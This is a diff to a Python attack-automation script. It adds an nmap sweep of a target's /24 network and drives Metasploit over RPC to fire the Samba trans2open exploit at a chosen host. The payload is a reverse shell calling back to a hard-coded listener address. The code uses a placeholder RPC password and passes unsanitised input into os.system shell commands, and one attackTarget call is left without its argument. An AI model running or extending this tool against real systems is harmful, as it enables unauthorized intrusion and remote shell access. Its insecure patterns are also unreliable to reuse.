@@ -5,7 +5,10 @@
 # Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
 import os
 import sys
+import re
 import time
+from pymetasploit3.msfrpc import MsfRpcClient
+
 
 
 def logo(logoFile):
@@ -14,14 +17,60 @@ def logo(logoFile):
             print(line, end='')
 
 
+def clearScreen():
+    count = 0
+    while count < 10000:
+        print("")
+        count += 1
+
+
+def hostDiscovery(target):
+    hostsIPV4 = []
+    menuCount = 1
+    menuSelect = 0
+    os.system("nmap -sn -oG hostDiscovery.tmp " + target + "\/24")
+    with open("hostDiscovery.tmp") as hostFile:
+        for line in hostFile:
+            hostsIPV4.append(str(re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', line)))
+    clearScreen()
+    for element in hostsIPV4:
+        print(str(menuCount)+": "+element)
+        menuCount += 1
+    print("Please enter a target IP to scan further!")
+    #menuSelect = input()
+    runScans(str(input()))
+
+
 def updateTools():
     os.system("searchsploit -u")
 
-def attackTarget():
+def attackTarget(target):
     #os.system("msfconsole msf exploit\(handler\) > load msgrpc Pass=pa55w0rd")
     #os.system("msfrpcd -U user -P pass123")
-    os.system("msfrpcd -P yourpassword -S")
-    #os.system("use exploit linux/samba/trans2open")
+    #os.system("msfrpcd -P yourpassword -S")
+    client = MsfRpcClient('yourpassword', ssl=True)
+    #time.sleep(20)
+    print("above")
+    #print(client.modules.exploits)
+    # exploit/unix/webapp/wp_admin_shell_upload
+    exploit = client.modules.use('exploit', 'linux/samba/trans2open')
+    print(exploit.description)
+    print(target)
+    exploit['RHOSTS'] = target
+    print(exploit.missing_required)
+    payload = client.modules.use('payload', 'generic/shell_reverse_tcp')
+    payload['LHOST'] = '192.168.56.108'
+    print("------------------------------")
+    print(payload.missing_required)
+    #payload['ReverseAllowProxy']
+    exploit.execute()
+    print(client.sessions.list)
+    #shell = client.sessions.session('1')
+    #shell.write('whoami')
+    #print(shell.read())
+
+    print("below")
+    #os.system("use exploit linux/samba/trans2open")cd /me
     #os.system("msfrpcd -P mypassword -n -f -a 127.0.0.1")
     #os.system("msfconsole")
     #time.sleep(60)
@@ -71,7 +120,9 @@ def main():
         runScans(sys.argv[1])
     elif len(sys.argv) > 2:
         for element in sys.argv:
-            if element.lower() == "-u":
+            if element.lower() == "-d":
+                hostDiscovery(sys.argv[1])
+            elif element.lower() == "-u":
                 updateTools()
                 if not scansComplete:
                     runScans(sys.argv[1])
@@ -82,7 +133,7 @@ def main():
                     scansComplete = True
                 attackTarget()
             elif element.lower() == "-x":
-                attackTarget()
+                attackTarget(sys.argv[1])
     else:
         print("Please supply target IP followed by zero or more parameters -u = update tools | -a = attack target")
         print("Examples: BRB 127.0.0.1")
